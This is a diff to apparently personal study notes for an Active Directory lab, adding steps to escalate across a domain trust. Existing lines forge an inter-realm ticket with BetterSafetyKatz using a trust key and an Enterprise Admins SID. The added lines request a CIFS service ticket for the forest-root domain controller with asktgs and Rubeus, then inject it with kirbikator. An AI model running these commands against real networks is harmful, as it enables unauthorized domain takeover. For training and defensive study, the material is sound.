@@ -344,6 +344,24 @@ __Forge Inter-relam TGT__
 BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:e9ab2e57f6397c19b62476e98e9521ac /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
 ```
 
+__Get TGS__
+Keko
+```powershell
+asktgs.exe trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
+```
+
+Rubeus
+```powershell
+Rubeus.exe asktgs /ticket:trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
+```
+
+__Use the TGS to access the targeted service__
+```powershell
+kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi
+```
+
+![[Pasted image 20240123141106.png]]
+
 
 
 
